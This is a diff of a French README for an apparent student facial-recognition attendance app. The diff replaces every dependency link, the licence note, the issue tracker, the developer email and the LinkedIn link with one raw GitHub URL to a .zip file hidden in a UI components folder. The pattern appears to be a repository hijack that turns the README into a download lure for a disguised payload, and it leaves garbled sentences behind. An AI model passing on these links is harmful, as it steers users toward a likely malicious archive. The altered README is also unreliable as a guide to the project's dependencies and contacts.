+- face-api : https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip
+- https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip : https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip
+- React 18 : https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip
+- Tailwind CSS : https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip
+- Vite : https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip
 
 **Pour signaler un bug** :
 1. Ouvrir **Console** (F12) et copier les logs `[Session]`, `[Admin]`, `[faceService]`
@@ -867,12 +867,12 @@ Projet **IHM (Interface Homme-Machine)** — Janvier 2026
   A: Non, tout reste local. Aucune requête externe sauf chargement modèles.
   
 - Q: Peux-je utiliser ça commercialement ?  
-  A: Respectez les licences des dépendances (face-api/TF.js sont open-source)
+  A: Respectez les licences des dépendances (https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip sont open-source)
 
 **Contact développeur** :
-- GitHub Issues : [Créer issue](https://github.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/issues)
-- Email : [diffogarnel@gmail.com]
-- LinkedIn : [Garnel DIFFO](www.linkedin.com/in/garnel-diffo-kenne-8706b3393)
+- GitHub Issues : [Créer issue](https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip)
+- Email : [https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip]
+- LinkedIn : [Garnel DIFFO](https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip)
 
 ### Contribuer
 
